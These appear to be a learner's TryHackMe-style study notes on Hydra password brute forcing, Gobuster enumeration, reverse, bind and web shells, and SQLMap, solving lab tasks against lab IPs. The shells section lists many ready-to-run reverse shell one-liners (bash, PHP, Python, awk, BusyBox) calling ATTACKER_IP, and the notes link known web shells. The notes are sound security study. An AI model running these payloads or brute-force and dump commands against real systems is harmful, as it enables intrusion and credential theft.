# OFFENSIVE SECURITY TOOLING

================================================================================================================================================================================================================================================================================================

#                                             HYDRA
================================================================================================================================================================================================================================================================================================

- Hydra is a free and open-source password-cracking tool. It can try numerous passwords till the correct password is found. It can be used to crack passwords for various network services, including SSH, Telnet, FTP, and HTTP.

- This shows the importance of using a strong password; if your password is common, doesn’t contain special characters and is not above eight characters, it will be prone to be guessed

- Commnad for hydra depends on which service we are using :
    -  if we wanted to brute force FTP with the username being user and a password list being passlist.txt, we’d use the following command:
        - ` hydra -l user -P passlist.txt ftp://10.10.152.100 `

- For us , this time we gotta use SSH , and the website uses POST method

- so for SSH , the command is as follows : ` ssh -l <username> -P <passowrd path> ip_address_of_target -t 4 SSH ` WHere:
    -  ` -l` => username
    -  ` -P` -> Password list
    -  ` -t` => No. of threads 
    - Add service at the end

- We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser’s network tab (in developer tools) to see the request types or view the source code.
    - For knowing the methods, go to developer option and then go to network tab, refrest webpage and u see request in the tab, click it and there u get the methods being used

- Now it was time for testing this skill out, so i am given a wbesite with ip ->   " http://10.10.152.100 "

- SO i had 2 taks, one is find SSH password and the next is find the WEBLOGIN password, as i knew the username , it was " molly "

- So for finding the ssh, what i did first is check if ssh is opne, so i did ` nmap -p 22  10.10.152.100 ` , i got to know that ssh is open

- Next i used `HYDRA` To find SSH password , as follows :
    - ` hydra -l molly -P <password path> -t 4 ssh://10.10.152.100 `
    - Them i got pass as ` butterfly `
    - now had to get the flag, so i logged in ssh as ` ssh molly@10.10.152.100 `, and entered the pass, hence i logged in as molly !

- Now i had to get the web login pass , for this i did as follows :
    - First i went to login page and then `F 12 ` DEVELOPERS option and then , netwrk tab !
    - After going to network tab , i refrehed the page and i found that LOGIN used GET form , so i ussed the following command :
        - ` hydra -l molly -P <pass path> 10.10.152.100 http-get-form "/login:username=^USER^&password=^PASS^:F=incorrect" -v `
        - This gave me 16 password, i tried all , none worked, then i came to know, even POST can be used for login pages, so i modify command to : ` hydra -l molly -P <pass path> 10.10.152.100 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -v `

        - HENCE i got the password.!

- REAL LIFE EXAPMPLE FOR HYDRA IS -> ` hydra -l <username> -P /usr/share/wordlists/rockyou.txt https://tryhackme.com http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect' `
 
================================================================================================================================================================================================================================================================================================

#                                               GObuster - BASICS
================================================================================================================================================================================================================================================================================================

- Go buster is a tool which will help u in reconisiance.

- this tool can enumerate web directories, subdomains, and virtual hosts

## Environment and Setup

- First we will be enabliing/comfiguring DNS setup

- i will be adding target ip to my DNS setting which will enable my system to resolve the domain names within  local network.

-  This setup allows you to communicate more effectively with the target machine during enumeration

- The Setup is as follows :
    - STEP1 =>  ` sudo nano /etc/resolv-dnsmasq. `
    - STEP2 => Insert` nameserver 10.10.57.14 ` as the first line. Ip is target ip address
    - STEP3 => save the IP
    - STEP4 => in the terminal write ` /etc/init.d/dnsmasq restart `
    - Thats all , then to check if ip is added or no , write => `cat /etc/resolv-dnsmasq `
    - dnsmasq acts as a lightweigh DNS forwarder 
    - The '/etc/init.d/' directory is part of the init system on Unix-like operating systems. It contains scripts that are used to start, stop, and manage system services during system boot and shutdown


## GOBUSTER INTRODUCTION

- gobuster is enumenration and brute force tool

- ENUMERATION  -> Enumeration is the act of listing all the available resources, whether they are accessible or not. For example, Gobuster enumerates web directories.

- BRUTE FORCE -> Brute force is the act of trying every possibility until a match is found. It is like having ten keys and trying them all on a lock until one fits. Gobuster uses wordlists for this purpose.

- For understandig Gobuster more , u can use command => ` gobuster --help `

-  Some of important flags that can be used with gobuster are as follows :
    - ` --threads ` => this is used to enumerate parallely.( ` -t ` ) can alsp be used
    - ` -w ` or ` --wordlist ` , this is used to assign wordlist to the gobuster
    - ` --delay ` => it is uswd to set delay time btw sending and receviing messages
    - ` --debug ` => this is used to debug when tool gives errors
    - ` -o ` or ` --output ` => this write the enumeration to an external file 

- EXAMPLE -> ` gobuster dir -u "http://www.example.thm/" -w /usr/share/wordlists/dirb/small.txt -t 64 ` WHERE :
    - dir =>  indicates that we will use the directory and file enumeration mode.
    - -u => used to set target url

1) What command do we use for the subdomain enumeration mode?
-> dns


## Use Case: Directory and File Enumeration

- Gobuster is powerful because it allows you to scan the website and return the status codes. These status codes immediately tell you if you, as an outside user, can request that directory or not.

- To know what gobuster dir can offfer u can use -> ` gobuster dir --help `

- Lets look at some flags used with `gobuster dir`
    - ` -c ` or ` -- cookies ` => cookies
    - ` -x ` or  `--extnesions` => This flag specifies which file extensions you want to scan for. E.g., .php, .js
    - `-H ` or ` --headers ` = This flag configures an entire header to pass along with each request.

    - and so on

- To run Gobuster in dir mode, use the following command format:
    `gobuster dir -u "http://www.example.thm" -w /path/to/wordlist`

- `gobuster dir -u "http://www.example.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r` is another example . This command scans all the directories located at www.example.thm using the wordlist directory-list-2.3-medium.txt.

- The URL must contain the protocol used, in this case, HTTP. This is important and required. If you pass the wrong protocol, the scan will fail.

- The host part of URL can also have tagrt ip rather than domain name, but sometimes what happens is a company can have multiple websites on same ip, so in this the attack might be targeted to some other website.

- -r configures Gobuster to follow the redirect responses received from the sent requests

1) Which flag do we have to add to our command to skip the TLS verification? Enter the long flag notation.
==> `--no-tls-validation `

2) Enumerate the directories of www.offensivetools.thm. Which directory catches your attention?

=> for this i used the following command = ` gobuster dir -u www.offensivetools.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r ` and after some time i found a dir, called ` secret ` and yes this is the ansewer.

3) Continue enumerating the directory found in question 2. You will find an interesting file there with a .js extension. What is the flag found in this file?
=> Now i had to enumerate into secret dir which i found in quest 2 adn for this instead of -r, i used ` -x .j `. The command is as :
-  `gobuster dir -u www.offensivetools.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .js ` and i got => flag.js.


## Use Case: Subdomain Enumeration

- dns mode allows Gobuster to brute force subdomains.
- If something is perfect/secure in one of domain doesnt mean it will be safe/secure in other domanin as well, so its always important to check all of the domains

- `gobuster dns --help `

- To run Gobuster in dns mode, use the following command syntax: `gobuster dns -d example.thm -w /path/to/wordlist` WHERE:
    - ` -d ` is for domain nme
    - ` -w ` is for wordlist path

- `gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt` WHERE :
    - gobuster dns enumerates subdomains on the configured domain.
    - -d example.thm sets the target to the example.thm domain.
    - -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt sets the wordlist to subdomains-top1million-5000.txt.    

1) Apart from the dns keyword and the -w flag, which shorthand flag is required for the command to work?
=> ` -d `

2) Use the commands learned in this task, how many subdomains are configured for the offensivetools.thm domain?
=> command i used is ` gobuster dns  -d offensivetools.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`


## Use Case: Vhost Enumeration

- The last and final mode we’ll focus on is the vhost mode. This mode allows Gobuster to brute force virtual hosts

- Virtual hosts are different websites on the same machine.

- To run Gobuster in vhost mode, type the following command: `gobuster vhost -u "http://example.thm" -w /path/to/wordlist `

- Gobuster’s vhost mode tries different subdomain names by changing the Host: header in web requests to see if the server treats those names as separate sites (virtual hosts).
DNS mode just asks DNS whether those subdomains exist.

- VIRTUAL HOST MEANS => One machine (one IP) can host many different websites.

- Those different websites on the same machine are virtual hosts. They may look like subdomains (e.g., blog.example.com) but they are discovered differently from DNS.

================================================================================================================================================================================================================================================================================================
#                                       Shells Overview
================================================================================================================================================================================================================================================================================================

## INTRDUCTION

- Shells in cyber security are widely used by attackers to remotely control systems

- There are different types of shells.

## SHELL OVERVIEW

- SHELL allows user to interact with the OS

- Having control over the shll/ access to the shll allows hackers to perfomr various attacks on thw system

- Attack that can be performed using shell is as follows:
    -  REMOTE CONTROL SYSTEM
    - PRIVILAGE ESCALATION
    - DATA EXFILTRATION => Copy/write data
    - PERSISTANCE AND MAINTAINANCE ATTACK =>attackers can create access through users and credentials 
    - POST EXPLOITATION ACTIVITIES
    - ACCESS OTHER SYSTEM ON THE NETWORK => also called PIVOTING
 
 1) What is the command-line interface that allows users to interact with an operating system?
=> SHELL

2) What process involves using a compromised system as a launching pad to attack other machines in the network?
=> PIVOTING

3) What is a common activity attackers perform after obtaining shell access to escalate their privileges?
=> Privilege Escalation


## REVERSE SHELL

- This type of attack is really a very good way to gain access, where what happens is the target connects to the attacker, hich can help avoid detection from network firewalls and other security appliances.

### How Reverse Shells Work

STEPS :

- 1)  Set up a Netcat (nc) Listener
    - Use `Netcat` to listen to a connection using the following command `nc -lvnp 443`. WHERE:
        - `-l` => option to indicate Netcat to listen or wait for a connection.
        - `-n` => option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address. 
        - `-v` => VERBOSE
        - `-p` => PORT 
        - Any port number can be used to establish connection , but better to use => 53, 80, 8080, 443, 139, or 445 , because most of the services run on these , so it helps reverse shell to blend the request adn not get caught, as firewall will think it is a normal traffic

- 2) Gaining Reverse Shell Access
    - Once we have our listener set, the attacker should execute what is known as a reverse shell payload
    - This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the networ

    - EXAMPLE => PIPE REVERSED SHELL => `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f `
        - what it does / what it means is as follows :
            - rm -f /tmp/f => rm = remove,-f means if there are no files dont show errors => so it removes a pipe files called f, present in tmp
            - mkfifo /tmp/f => mkfifo creates a named pipe (a FIFO special file) on the filesystem. It saves file intmp, with name " f "
            - cat /tmp/f => this opens the newly created piped file
            - `|` => called as pipe => A pipe (|) takes the output of the command on its left and feeds it as input to the command on its right
            - sh -i 2>&1 => sh means shell , -i means make the shell interactive , 2>&1 means both error and output must be showed in the same channel
                - 2>&1 means “make file-descriptor 2 (stderr) go to the same place as file-descriptor 1 (stdout) is currently going.”
                - Programs have at least three streams:
                        0 = stdin (input)
                        1 = stdout (normal output)
                        2 = stderr (error output)
                - A file descriptor (FD) is just a small number the operating system uses to keep track of an open file or data stream for a program.
                - When you type into a program → it comes from stdin (0).
                - When the program prints something normally → it goes to stdout (1).
                - When the program prints an error → it goes to stderr (2).


- SO how i made this work is as follows, first i set up an NETCAT listener on port 443, where i was planning to connect and kep this running, then open a new terminal and then wrote the payload and boom , i could connect on port 443 of the attacker

## Bind Shell

- a bind shell will bind a port on the compromised system and listen for a connection
- less popular since it needs to remain active and listen for connections, which can lead to detection.

### How bind shells work

STEPS TO SET IT UP :

- 1) USE THE COMMAND ` rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f `
    - same as the previous one, only nc is changed
    - What nc does here is,listen to all interfaces(0.0.0.0) and port 8080
    
- The command above will listen for incoming connections and expose a bash shel

- We need to note that ports below 1024 will require Netcat to be executed with elevated privileges. 

1) What type of shell opens a specific port on the target for incoming connections from the attacker?
=> BIND SHELL

2) Listening below which port number requires root access or privileged permissions?
=>1024


## Shell Listeners

-  A utility like Netcat will handle the connection and allow the attacker to interact with the exposed shell, but Netcat is not the only utility that will allow us to do that.

SOME OF OTHER LISTENERS ARE :

1) `Rlwrap`
- command =>  ` rlwrap nc -lvnp 443`
- This wraps nc with rlwrap, allowing the use of features like arrow keys and history for better interaction

2) `Ncat`
- Ncat is an improved version of Netcat , provides ssl encryption
- command => `  ncat -lvnp 4444 `
- commad => ` ncat --ssl -lvnp 4444 ` where --ssl option enables SSL encryption for the listener.

3) `Socat`
- `socat -d -d TCP-LISTEN:443 STDOUT ` where -d enables vrbosity and using it again doubles the speed
- The `TCP-LISTEN:443` option creates a TCP listener on port 443, establishing a server socket for incoming connections
- STDOUT => redirect the incoming data to the terminal

4) Which flexible networking tool allows you to create a socket connection between two data sources?
=> socat

5) Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?
=> RLWRAP

6) What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells?
=> NCAT


## Shell Payloads

- A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell

- LETS EXPLORE FEW PAYLOAD THAT CAN BE USED IN MANY OS FOR REVERSE SHELL:

### BASH
1)  Normal Bash Reverse Shell
-  `bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 `
- This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port 443. The >& operator combines both standard output and standard error.

2) Bash Read Line Reverse Shell
- `exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done `
- This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.

3) Bash With File Descriptor 196 Reverse Shell
- `0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196`
- This reverse shell uses a file descriptor (196 in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection

4) Bash With File Descriptor 5 Reverse Shell
- `bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5`
- this command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection.

### PHP

1) PHP Reverse Shell Using the exec Function
- `php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' `
- This reverse shell creates a socket connection to the attacker's IP on port 443 and uses the exec function to execute a shell, redirecting standard input and output

2) PHP Reverse Shell Using the shell_exec Function
- `php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'`
- Similar to the previous command, but uses the shell_exec function.

3) PHP Reverse Shell Using the system Function
- `php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' `
- This reverse shell employs the system function, which executes the command and outputs the result to the browser.

4) PHP Reverse Shell Using the passthru Function
- `php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");' `
- The passthru function executes a command and sends raw output back to the browser. This is useful when working with binary data.

5) PHP Reverse Shell Using the popen Function
- ` php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'` 
- This reverse shell uses popen to open a process file pointer, allowing the shell to be executed

### Python

- the following snippets below require using python -c to run, indicated by the placeholder PY-C

1) Python Reverse Shell by Exporting Environment Variables

- `export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' `
- This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.

2) Python Reverse Shell Using the subprocess Module
- `PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' `
- This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.

3) Short Python Reverse Shell
- `PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`
- This reverse shell creates a socket (s), connects to the attacker, and redirects standard input, output, and error to the socket using os.dup2()

### TELNET 

1) Telnet
-  `TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF`
- This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443

 1) AWK
- `awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`
- This reverse shell uses AWK’s built-in TCP capabilities to connect to ATTACKER_IP:443. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.

1) BusyBox
- `busybox nc ATTACKER_IP 443 -e sh`
- This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker.

1) Which Python module is commonly used for managing shell commands and establishing reverse shell connections in security assessments?
- PYTHON SUBPROCESS

2) What shell payload method in a common scripting language uses the exec, shell_exec, system, passthru, and popen functions to execute commands remotely through a TCP connection?
- php

3) Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection?
- python


## Web Shell

- A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself.
- A web shell is usually a file containing the code that executes commands and handles files.
- It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.

- Lest take an example of PHP file, so what we can do is write a code using PHP and save it, as shell.php and then we can inject this file inside the webrowser if following vulnerabilities exist => Unrestricted File Upload, File Inclusion, Command Injection, among others, or by gaining unauthorized access to it. 

- Existing Web Shells Available Online
    - P0WNY SHELL => [https://github.com/flozz/p0wny-shell] - A minimalistic single-file PHP web shell that allows remote command execution
    - B374K SHELL => [https://github.com/b374k/b374k]=> A more feature-rich PHP web shell with file management and command execution, among other functionalities.
    - C99 SHELL => [https://www.r57shell.net/single.php?id=13] A well-known and robust PHP web shell with extensive functionality.
    
1) What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?
=> UNRESTRICTED FILE UPLOAD

2) What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?
=> WEB SHELL


## PRACTICAL TASK

1) Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?

2) Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?
=> For this first i went to the vuln website 
- Then went to termiinal , create a .php file with code as follows:( ` nano shell.php `)
    < ?php
    echo "<pre>";
    echo "Flag content : \n";
    echo file_get_contents('/flag.txt');
    echo "</pre>";
    ?>
- then in the website, instead of cv, uploaded this shell.php and then using the url browsed to ` /uploads/shell.php ` and boom , i got the answer







================================================================================================================================================================================================================================================================================================
#                                                       SQLMap: The Basics
================================================================================================================================================================================================================================================================================================

## INTRODUCTION

- First lets learn what a database is ? In website when users have to input their credential or when the website have to display ur request, what happens is, all the user input information adn many other info are stores in the DATABASE and all these databases are managed by Database Management Systems (DBMS), such as MySQL, PostgreSQL, SQLite, or Microsoft SQL Server. 

1) Which language builds the interaction between a website and its database?
=> SQL

## SQL Injection Vulnerability

-  SQL injection has a very harmful effect in this digital world as all organizations store their data, including their critical information, inside the databases, and a successful SQL injection attack can compromise their critical data.

- OK so lets takee an example of how SQL query is carried out.

- Lets say u have a usr :JOHN and his pass : 123
- But thw attacker knows john is in the website, but doesnt know his pass/creds
- so, now how can he log in as JOHN?
- For this he uses a special query in place of pass .
- ORIGINALLY THE SQL QUERY WILL BE AS FOLLOWS : `SELECT * FROM users WHERE username = 'John' AND password = '123';`
- Now hacker will use this quesry to extract the details => `SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';`
    - This cmd should fail, because abc is not a pssword and AND condition is used, but with sql injection this might pass and here is why:
    - So what might happen is , first usrname is checked and it is ture, so one thing is good.
    - Now pass is checked against 'abc', but abc is not a pss , so as per AND it query must give a error ,but but see in the pass section there is another command with OR condition ie ` 1=1 `, so here is the key to success, now it first checkks the abc and when false, it see and it be like, ouh there is another condition and it check thje condition ` 1=1 ` , which is always true, hence it returns true and there we go, we have accesss the John's account

1) Which boolean operator checks if at least one side of the operator is true for the condition to be true?
=> OR

2) Is 1=1 in an SQL query always true? (YEA/NAY)
=> YUPPO

## Automated SQL Injection Tool

- Carrying out an SQL injection attack involves discovering the SQL injection vulnerability inside the application and manipulating the database.

- SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications.

- The `--help` command with SQLMap will list all the available flags you can use. 

- You can also use the `--wizard` flag with SQLMap. When you use this flag, the tool will guide you through each step and ask questions to complete the scan, making this a perfect option for beginners.

- Some of the flags :
    - ` -dbs ` helps u extrract all the database names
    - `-D database_name --tables` => all the tables from specific dataabase
    - `-D database_name -T table_name --dump` => enumerate records present iin the table

- practical scenario :
    - The first step is to look for a possible vulnerable URL or request. You may often come across some URLs that use GET parameters to retrieve the data. For example, a URL like http://sqlmaptesting.thm/search?cat=1 uses a parameter cat that takes the value 1. If you see any web application using GET parameters in the URLs to retrieve data, you can test that URL with the `-u` flag in the SQLMap tool. This is considered to be HTTP GET-based testing. This approach is followed when the application uses GET parameters in the URL to retrieve data from the searches.
    - URLs that have GET parameters can be vulnerable to SQL injection
    - Command to use in temrinal to check out if vuln => `sqlmap -u http://sqlmaptesting.thm/search/cat=1`
    - Using the above command we go to know that target is vulnerable.
    - Now lets fetch databases ` sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs `
    - We got 2 databases, ` users ` and `members`
    - Now lets get tables inside DB => `sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables`
    - WE got 3 Tables =>    | johnath   |
                            | alexas    |
                            | thomas    |
    - Now lets dump info from thomas table.
    - To do so, we will define the database with the -D flag, the table with the -T flag, and for extracting the records of the table, we will use the --dump flag.
    - SO the command is as follows => ` sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump`

1) Which flag in the SQLMap tool is used to extract all the databases available?
=> --dbs

2) What would be the full command of SQLMap for extracting all tables from the "members" database? (Vulnerable URL: http://sqlmaptesting.thm/search/cat=1)
=> sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables


## PRACTICAL TASK

- Here the task was simple, 3 quest were given adn i could answer almost all without help .
- So iniitally we need to know if SQLi is there, so what i do is we know we have 2 types of request for SQLI to be possible 
- POST and GET
- In our case, GET was confired
- But this time in URL, we could not use/see the command for get directly as it was logini page.
- Now in order to use SQLmap i need entire url with GET .
- So i went to login page and right click and inspect and then put some random email abd pass and there i got the GET method and using the GET method , i did click it and there i got a URL with GET

1) How many databases are available in this web application?
=> `sqlmap -u 'http://10.10.12.143/ai/includes/user_login?email=test&password=test' --dbs`
- Write the URL withing siingle quote to avoid errors
- ` -dbs ` , gives us all databases.
- ANSWER IS 6

2) What is the name of the table available in the "ai" database?
=> ` sqlmap -u 'http://10.10.12.143/ai/includes/user_login?email=test&password=test' -D ai --tables `
- `-D ` means select the database , ie ai in this case
- `--tables` means give me all tables in DB ai

3) What is the password of the email test@chatai.com?
=> Then to get the password what i did was 
- ` sqlmap -u 'http://10.10.12.143/ai/includes/user_login?email=test&password=test' -D ai -T user --dump`
- ` -T ` means select the table , ie user in this case
- ` --dump ` means give me all values from the selected table